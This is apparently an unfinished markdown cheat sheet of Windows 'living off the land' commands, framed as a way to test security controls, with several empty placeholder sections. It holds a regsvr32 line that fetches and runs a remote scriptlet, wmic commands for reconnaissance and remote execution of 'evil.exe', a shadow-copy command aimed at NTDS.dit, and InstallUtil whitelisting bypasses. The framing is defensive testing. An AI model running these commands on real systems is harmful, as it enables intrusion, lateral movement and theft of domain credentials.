# Native - Living off the land

Living off the land is using native operating system utilities to bypass controls in place. At most organizations, this will be AppWhitelisting, AV, endpoint detection software and so on. From the endpoint to the network, you should see some type of activity occur. If you have deep packet inspection, and a sct file is downloaded with powershell, did your network device detect or prevent this? Remember, this is to determine if your current controls are properly working as they were described to you.

## One Liners


## net.exe

Input:

    code here

Output:

    code here

## Regsvr32.exe

Input:

    code here

Output:

    code here

    regsvr32.exe /s /n /u /i:https://<website>/data scrobj.dll

## waitfor.exe

Input:

    code here

Output:

    code here

## wmic.exe

Provided by: https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/sans-dfir-2015.pdf


### Reconnaissance

Input:

    wmic useraccount get /ALL

Input:

    wmic process get caption,executablepath,commandline

Input:

    wmic qfe get description,installedOn /format:csv

Input:

    wmic /node:”192.168.0.1” service where (caption like “%sql server (%”)

Input:

    get-wmiobject –class “win32_share” –namespace “root\CIMV2” –computer “targetname”

### Lateral Movement

Input:

    wmic /node:REMOTECOMPUTERNAME process call create “COMMAND AND ARGUMENTS"

Input:

    wmic /NODE: “192.168.0.1” process call create “evil.exe”

### Privileged Escalation

Input:

    wmic /node:REMOTECOMPUTERNAME PROCESS call create “at 9:00PM c:\GoogleUpdate.exe ^> c:\notGoogleUpdateResults.txt"

Input:

    wmic /node:REMOTECOMPUTERNAME PROCESS call create “cmd /c vssadmin create shadow /for=C:\Windows\NTDS\NTDS.dit > c:\not_the_NTDS.dit“

## bitsadmin.exe

Input:

    code here

Output:

    code here

## Installutil.exe

Download the two binaries:

Input for pshell.dll:

    C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /logtoconsole=false /U pshell.dll

Input for rwxhunter.exe:

    C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /U rwxhunter.exe
